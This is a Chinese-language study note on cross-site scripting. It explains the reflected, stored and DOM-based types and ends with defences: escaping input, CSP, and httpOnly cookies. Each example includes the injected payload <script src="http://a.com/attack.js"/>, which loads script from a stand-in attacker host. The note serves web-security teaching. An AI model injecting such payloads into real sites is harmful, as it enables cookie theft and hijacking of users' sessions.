---
sidebar:
group:
title: xss攻击
isTimeLine: true
date: 11-10-2023
---
# xss攻击

## XSS 跨站脚本攻击

指攻击者在网页中注入恶意代码，在用户浏览网页的时候进行攻击。

类型：

反射型（非持久性）

原理：将攻击代码放在 url 地址的请求参数中，其他用户访问该恶意链接时，服务端在 URL 取出恶意代码后拼接至 HTML 中返回给用户浏览器。

要点：

通过 URL 插入恶意代码。
有服务端参与。
需要用户访问特定链接。
例子：

攻击者诱导被害者打开链接 hzfe.org?name=<script src="http://a.com/attack.js"/>。

被攻击网站服务器收到请求后，未经处理直接将 URL 的 name 字段直接拼接至前端模板中，并返回数据。

被害者在不知情的情况下，执行了攻击者注入的脚本（可以通过这个获取对方的 Cookie 等）。

存储型（持久性）

原理：攻击者将注入型脚本提交至被攻击网站数据库中，当其他用户浏览器请求数据时，注入脚本从服务器返回并执行。

要点：

恶意代码存储在目标网站服务器上。
有服务端参与。
只要用户访问被注入恶意脚本的页面时，就会被攻击。
例子：

攻击者在目标网站留言板中提交了 <script src="http://a.com/attack.js"/>。

目标网站服务端未经转义存储了恶意代码，前端请求到数据后直接通过 innerHTML 渲染到页面中。

其他用户在访问该留言板时，会自动执行攻击者注入脚本。

DOM 型

原理：攻击者通过在 URL 插入恶意代码，客户端脚本取出 URL 中的恶意代码并执行。

要点：在客户端发生。

例子：

攻击者诱导被害者打开链接 hzfe.org?name=<script src="http://a.com/attack.js"/>。

被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。

被害者在不知情的情况下，执行了攻击者注入的脚本。

防范 XSS：

对于外部传入的内容进行充分转义。
开启 CSP（Content Security Policy，内容安全策略），规定客户端哪些外部资源可以加载和执行，降低 XSS 风险。
设置 Cookie httpOnly 属性，禁止 JS 读取 Cookie 防止被窃取。
#


















